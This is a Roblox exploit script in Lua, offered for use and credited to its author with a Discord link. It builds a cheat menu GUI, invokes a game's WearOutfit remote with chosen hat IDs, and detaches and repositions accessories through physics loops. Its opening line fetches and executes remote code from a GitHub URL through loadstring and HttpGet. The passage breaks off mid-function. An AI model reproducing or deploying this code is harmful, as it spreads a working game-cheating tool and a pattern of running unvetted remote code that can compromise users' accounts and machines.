_G.CustomUI = false
loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()local NotificationBindable = Instance.new("BindableFunction")
local Msgreq = function(Title,Text,Duration,Button1Text,Button2Text)
	game.StarterGui:SetCore("SendNotification", {
		Title = Title;
		Text = Text;
		Icon = "";
		Duration = Duration;
		Button1 = Button1Text;
		Button2 = nil;
		Callback = NotificationBindable;
	})
end



game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Notification";
	Text = "Netless activated";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 16;
Msgreq("made by emplic","AKA NOTEMPLIC ON ROBLOX have fun kid.",5,nil)

if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
   msg = Instance.new("Message",workspace)
   msg.Text = "MADE BY EMPLIC DISCORD:https://discord.gg/U5tRwJ2Ku8"
   wait(3)
   msg:Destroy()
   else
     
end

local ScreenGui = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local Bar = Instance.new("Frame")
local HatScripts = Instance.new("TextButton")
local Script = Instance.new("TextButton")
local Script_2 = Instance.new("TextButton")
local Script_3 = Instance.new("TextButton")
local Script_4 = Instance.new("TextButton")
local Script_5 = Instance.new("TextButton")
local Script_6 = Instance.new("TextButton")
local Script_7 = Instance.new("TextButton")
local Script_8 = Instance.new("TextButton")
local Script_9 = Instance.new("TextButton")
local Script_10 = Instance.new("TextButton")
local Script_11 = Instance.new("TextButton")
local Script_12 = Instance.new("TextButton")
local Script_13 = Instance.new("TextButton")
local Script_14 = Instance.new("TextButton")
local Script_15 = Instance.new("TextButton")
local Script_16 = Instance.new("TextButton")
local Script_17 = Instance.new("TextButton")
local Script_18 = Instance.new("TextButton")
local Script_19 = Instance.new("TextButton")
local Script_20 = Instance.new("TextButton")
local Script_21 = Instance.new("TextButton")
local Script_22 = Instance.new("TextButton")
local Script_23 = Instance.new("TextButton")
local Script_24 = Instance.new("TextButton")
local Script_25 = Instance.new("TextButton")
local Script_26 = Instance.new("TextButton")
local Script_27 = Instance.new("TextButton")
local Script_28 = Instance.new("TextButton")
local Stats = Instance.new("TextButton")
local PlrCount = Instance.new("TextLabel")
local Plrs = Instance.new("TextLabel")
local MouseTarget = Instance.new("TextLabel")
local TargetName = Instance.new("TextLabel")
local NetworkStatus = Instance.new("TextLabel")
local NetworkStatus_2 = Instance.new("TextLabel")
local PrintOtherExploiters = Instance.new("TextButton")
local Menu = Instance.new("TextButton")
local RHS = Instance.new("TextLabel")
local Player = Instance.new("ImageLabel")
local PlayerName = Instance.new("TextLabel")
local Thank = Instance.new("TextLabel")
local Scripts = Instance.new("TextButton")
local Script_29 = Instance.new("TextButton")
local Script_30 = Instance.new("TextButton")
local Script_31 = Instance.new("TextButton")
local Script_32 = Instance.new("TextButton")
local Script_33 = Instance.new("TextButton")
local Script_34 = Instance.new("TextButton")
local Script_35 = Instance.new("TextButton")
local Script_36 = Instance.new("TextButton")
local Script_37 = Instance.new("TextButton")
local Script_38 = Instance.new("TextButton")
local Script_39 = Instance.new("TextButton")
local Script_40 = Instance.new("TextButton")
local Script_41 = Instance.new("TextButton")
local Script_42 = Instance.new("TextButton")
local Script_43 = Instance.new("TextButton")
local Script_44 = Instance.new("TextButton")
local Script_45 = Instance.new("TextButton")
local Script_46 = Instance.new("TextButton")
local Script_47 = Instance.new("TextButton")
local Script_48 = Instance.new("TextButton")
local Script_49 = Instance.new("TextButton")
local Script_50 = Instance.new("TextButton")
local Script_51 = Instance.new("TextButton")
local Script_52 = Instance.new("TextButton")
local Script_53 = Instance.new("TextButton")
local Script_54 = Instance.new("TextButton")
local Script_55 = Instance.new("TextButton")
local Script_56 = Instance.new("TextButton")
local colorSelect = Instance.new("TextButton")
local alive = true

game['Run Service'].RenderStepped:Connect(function()
if game.Players.LocalPlayer.Character.Humanoid.Health >= 0 then
      alive = false
end
if game.Players.LocalPlayer.Character.Humanoid.Health == 100 then
      alive = true
end
end)

-- important

local tab1 = Menu
local tab2 = HatScripts
local tab3 = Scripts
local tab4 = Stats

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

local unselected = Color3.fromRGB(77, 109, 157)
local selected = Color3.fromRGB(175, 255, 242)
print(selected)

local function unselectAll()
   tab1.BackgroundColor3 = unselected
   tab1.BackgroundTransparency = 0
   tab2.BackgroundColor3 = unselected
   tab2.BackgroundTransparency = 0
   tab3.BackgroundColor3 = unselected
   tab3.BackgroundTransparency = 0
   tab4.BackgroundColor3 = unselected
   tab4.BackgroundTransparency = 0
end

local function selectMenu()
    unselectAll()
    tab1.BackgroundColor3 = selected
    tab1.BackgroundTransparency = 0
end

local function selectHatScripts()
    unselectAll()
    tab2.BackgroundColor3 = selected
    tab2.BackgroundTransparency = 0
end

local function selectScripts()
    unselectAll()
    tab3.BackgroundColor3 = selected
    tab3.BackgroundTransparency = 0
end

local function selectStats()
    unselectAll()
    tab4.BackgroundColor3 = selected
    tab4.BackgroundTransparency = 0
end


local function closeMenu()
	for i,thing in pairs(Menu:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = false
		end
		if thing:IsA("ImageButton") then
			thing.Visible = false
		end
		if thing:IsA("TextLabel") then
			thing.Visible = false
		end
		if thing:IsA("TextBox") then
			thing.Visible = false
		end
		if thing:IsA("TextButton") then
			thing.Visible = false
		end
	end
end

local function closeHatScripts()
	for i,thing in pairs(HatScripts:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = false
		end
		if thing:IsA("ImageButton") then
			thing.Visible = false
		end
		if thing:IsA("TextLabel") then
			thing.Visible = false
		end
		if thing:IsA("TextBox") then
			thing.Visible = false
		end
		if thing:IsA("TextButton") then
			thing.Visible = false
		end
	end
end

local function closeScripts()
	for i,thing in pairs(Scripts:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = false
		end
		if thing:IsA("ImageButton") then
			thing.Visible = false
		end
		if thing:IsA("TextLabel") then
			thing.Visible = false
		end
		if thing:IsA("TextBox") then
			thing.Visible = false
		end
		if thing:IsA("TextButton") then
			thing.Visible = false
		end
	end
end

local function closeStats()
	for i,thing in pairs(Stats:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = false
		end
		if thing:IsA("ImageButton") then
			thing.Visible = false
		end
		if thing:IsA("TextLabel") then
			thing.Visible = false
		end
		if thing:IsA("TextBox") then
			thing.Visible = false
		end
		if thing:IsA("TextButton") then
			thing.Visible = false
		end
	end
end

local function closeAll()
	closeMenu()
	closeHatScripts()
	closeScripts()
	closeStats()
end
-- open
local function openMenu()
	for i,thing in pairs(Menu:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = true
		end
		if thing:IsA("ImageButton") then
			thing.Visible = true
		end
		if thing:IsA("TextLabel") then
			thing.Visible = true
		end
		if thing:IsA("TextBox") then
			thing.Visible = true
		end
		if thing:IsA("TextButton") then
			thing.Visible = true
		end
	end
end

local function openHatScripts()
	for i,thing in pairs(HatScripts:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = true
		end
		if thing:IsA("ImageButton") then
			thing.Visible = true
		end
		if thing:IsA("TextLabel") then
			thing.Visible = true
		end
		if thing:IsA("TextBox") then
			thing.Visible = true
		end
		if thing:IsA("TextButton") then
			thing.Visible = true
		end
	end
end

local function openScripts()
	for i,thing in pairs(Scripts:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = true
		end
		if thing:IsA("ImageButton") then
			thing.Visible = true
		end
		if thing:IsA("TextLabel") then
			thing.Visible = true
		end
		if thing:IsA("TextBox") then
			thing.Visible = true
		end
		if thing:IsA("TextButton") then
			thing.Visible = true
		end
	end
end

local function openStats()
	for i,thing in pairs(Stats:GetChildren()) do
		if thing:IsA("ImageLabel") then
			thing.Visible = true
		end
		if thing:IsA("ImageButton") then
			thing.Visible = true
		end
		if thing:IsA("TextLabel") then
			thing.Visible = true
		end
		if thing:IsA("TextBox") then
			thing.Visible = true
		end
		if thing:IsA("TextButton") then
			thing.Visible = true
		end
	end
end

Background.Name = "Background"
Background.Parent = ScreenGui
Background.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
Background.BackgroundTransparency = 0.200
Background.BorderColor3 = Color3.fromRGB(0, 85, 127)
Background.BorderSizePixel = 2
Background.Position = UDim2.new(0.365799248, 0, 0.331695318, 0)
Background.Size = UDim2.new(0, 360, 0, 273)
Background.Active = true
Background.Draggable = true
Background.Selectable = true

Exit.Name = "Exit"
Exit.Parent = Background
Exit.BackgroundColor3 = Color3.fromRGB(199, 242, 255)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0.862308919, 0, 0.0236564893, 0)
Exit.Size = UDim2.new(0, 43, 0, 39)
Exit.Font = Enum.Font.SourceSans
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(255, 0, 4)
Exit.TextScaled = true
Exit.TextSize = 100.000
Exit.TextStrokeTransparency = 0.800
Exit.TextWrapped = true
Exit.MouseButton1Click:connect(function()
	ScreenGui:Destroy()
end)

Bar.Name = "Bar"
Bar.Parent = Background
Bar.BackgroundColor3 = Color3.fromRGB(175, 255, 242)
Bar.BackgroundTransparency = 0.100
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.0166666675, 0, 0.16483517, 0)
Bar.Size = UDim2.new(0, 291, 0, 12)

HatScripts.Name = "HatScripts"
HatScripts.Parent = Bar
HatScripts.BackgroundColor3 = Color3.fromRGB(77, 109, 157)
HatScripts.BackgroundTransparency = 0.600
HatScripts.BorderSizePixel = 0
HatScripts.Position = UDim2.new(0.223367691, 0, -1.16666663, 0)
HatScripts.Size = UDim2.new(0, 52, 0, 14)
HatScripts.Font = Enum.Font.SourceSans
HatScripts.Text = "Main Scripts"
HatScripts.TextColor3 = Color3.fromRGB(0, 0, 0)
HatScripts.TextSize = 14.000
HatScripts.MouseButton1Click:connect(function()
    closeAll()
    openHatScripts()
    selectHatScripts()
end)

Script.Name = "HOMEBREWADMIN"
Script.Parent = HatScripts
Script.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script.Position = UDim2.new(-1.25, 0, 15, 0)
Script.Size = UDim2.new(0, 52, 0, 19)
Script.Visible = false
Script.Font = Enum.Font.SourceSans
Script.Text = "Tall Man"
Script.TextColor3 = Color3.fromRGB(0, 0, 0)
Script.TextSize = 14.000
Script.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "63690008"
local args = {
    Face = "";
    
    Hat1 = "376524487";
    Hat2 = "451220849";
    Hat3 = "20372960";
    Hat4 = "62724852";
    Hat5 = "48474294";
    Hat6 = "62234425";
    Hat7 = "63690008";

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)

local function rightLeg()
    -- Main Animation
-- Hat Position
local HAT = "Bedhead"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


hum.HipHeight = 4
game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Right Leg"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Right Leg"].Orientation.X + XvalO.Value, plr.Character["Right Leg"].Orientation.Y + YvalO.Value, plr.Character["Right Leg"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function leftLeg()
    -- Main Animation
-- Hat Position
local HAT = "Pal Hair"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Left Leg"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Left Leg"].Orientation.X + XvalO.Value, plr.Character["Left Leg"].Orientation.Y + YvalO.Value, plr.Character["Left Leg"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function rightLeg2()
    -- Main Animation
-- Hat Position
local HAT = "Hat1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -4
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Right Leg"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Right Leg"].Orientation.X + XvalO.Value, plr.Character["Right Leg"].Orientation.Y + YvalO.Value, plr.Character["Right Leg"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function leftLeg2()
    -- Main Animation
-- Hat Position
local HAT = "Kate Hair"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -4
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Left Leg"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Left Leg"].Orientation.X + XvalO.Value, plr.Character["Left Leg"].Orientation.Y + YvalO.Value, plr.Character["Left Leg"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function rightArm()
    -- Main Animation
-- Hat Position
local HAT = "LavanderHair"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Right Arm"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Right Arm"].Orientation.X + XvalO.Value, plr.Character["Right Arm"].Orientation.Y + YvalO.Value, plr.Character["Right Arm"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function leftArm()
    -- Main Animation
-- Hat Position
local HAT = "Pink Hair"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr["Left Arm"]);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character["Left Arm"].Orientation.X + XvalO.Value, plr.Character["Left Arm"].Orientation.Y + YvalO.Value, plr.Character["Left Arm"].Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function neck()
    -- Hat Position
local HAT = "MessyHair"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -1.32
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function sword()
        -- Main Animation
-- Hat Position
local at32 = game.Players.LocalPlayer.Character:FindFirstChild("LavanderHair").Handle 
local HAT = "MeshPartAccessory"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -3
Zval.Value = 1

XvalO.Value = 180
YvalO.Value = 90
ZvalO.Value = 225

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', at32);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
changetog = true
local function change()
    if changetog == true then
        changetog = false
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        Zval.Value = math.random(-10,10)
        Xval.Value = math.random(-10,10)
        wait(.1)
        changetog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
